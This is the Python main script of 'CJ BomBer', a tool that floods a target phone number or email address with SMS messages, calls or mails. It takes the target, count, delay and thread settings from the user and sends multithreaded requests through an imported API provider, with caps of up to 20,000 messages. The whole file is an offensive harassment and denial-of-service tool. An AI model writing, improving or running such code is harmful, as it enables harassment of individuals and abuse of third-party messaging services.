#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import shutil
import sys
import string
import json
import re
import time
import argparse
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print("Type `pip3 install -r requirements.txt` to install all required packages")
    sys.exit(1)

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '1.0'

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def bann_text():
    clr()
    logo = """
    
    CJ BomBer
"""
    version = "Version: "+__VERSION__
    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    print(version)
    print(contributors)
    print()

def check_intr():
    try:
        requests.get("https://www.google.com", timeout=5)  # Using Google for internet connectivity check
    except Exception:
        bann_text()
        print("Poor internet connection detected")
        sys.exit(2)

def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()

def get_phone_info():
    while True:
        target = ""
        cc = input("Enter your country code (Without +): ")
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            print("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
            continue
        target = input("Enter the target number: +" + cc + " ")
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            print("The phone number ({target}) that you have entered is invalid".format(target=target))
            continue
        return (cc, target)

def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input("Enter target mail: ")
        if not re.search(mail_regex, target, re.IGNORECASE):
            print("The mail ({target}) that you have entered is invalid".format(target=target))
            continue
        return target

def pretty_print(cc, target, success, failed):
    requested = success + failed
    print("Bombing is in progress - Please be patient")
    print("Please stay connected to the internet")
    print("Target       : " + cc + " " + target)
    print("Sent         : " + str(requested))
    print("Successful   : " + str(success))
    print("Failed       : " + str(failed))
    print("CJ Bomber was created by CJ")

def workernode(mode, cc, target, count, delay, max_threads):
    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    print("Gearing up the Bomber - Please be patient")
    print("Please stay connected to the internet ")
    print("API Version   : " + api.api_version)
    print("Target        : " + cc + target)
    print("Amount        : " + str(count))
    print("Threads       : " + str(max_threads) + " threads")
    print("Delay         : " + str(delay) + " seconds")
    print()
    input("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it")

    if len(APIProvider.api_providers) == 0:
        print("Your country/target is not supported yet")
        print("Feel free to reach out to us")
        input("Press [ENTER] to exit")
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count - success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    print("Bombing limit for your target has been reached")
                    print("Try Again Later !!")
                    input("Press [ENTER] to exit")
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    print("Bombing completed!")
    time.sleep(1.5)
    bann_text()
    sys.exit()

def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()

        max_limit = {"sms": 10000, "call": 15000, "mail": 20000}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                message = ("Enter number of {type}".format(type=mode.upper()) + " to send (Max {limit}): ".format(limit=limit))
                count = int(input(message).strip())
                if count > limit or count == 0:
                    print("You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    print("Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = float(input("Enter delay time (in seconds): ").strip())
                max_thread = int(input("Enter max threads: ").strip())
                break
            except Exception:
                print("Invalid input, please enter a number")

        workernode(mode, cc, target, count, delay, max_thread)

    except KeyboardInterrupt:
        bann_text()
        sys.exit()

if __name__ == '__main__':
    __VERSION__ = get_version()
    __CONTRIBUTORS__ = ["CJ","AI"]
    ALL_COLORS = [Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
    RESET_ALL = Style.RESET_ALL

    parser = argparse.ArgumentParser()
    parser.add_argument("--call", action="store_true", help="start call bomber")
    parser.add_argument("--sms", action="store_true", help="start sms bomber")
    parser.add_argument("--mail", action="store_true", help="start mail bomber")

    args = parser.parse_args()

    if args.sms:
        selectnode("sms")
    elif args.call:
        selectnode("call")
    elif args.mail:
        selectnode("mail")
    else:
        selectnode("sms")
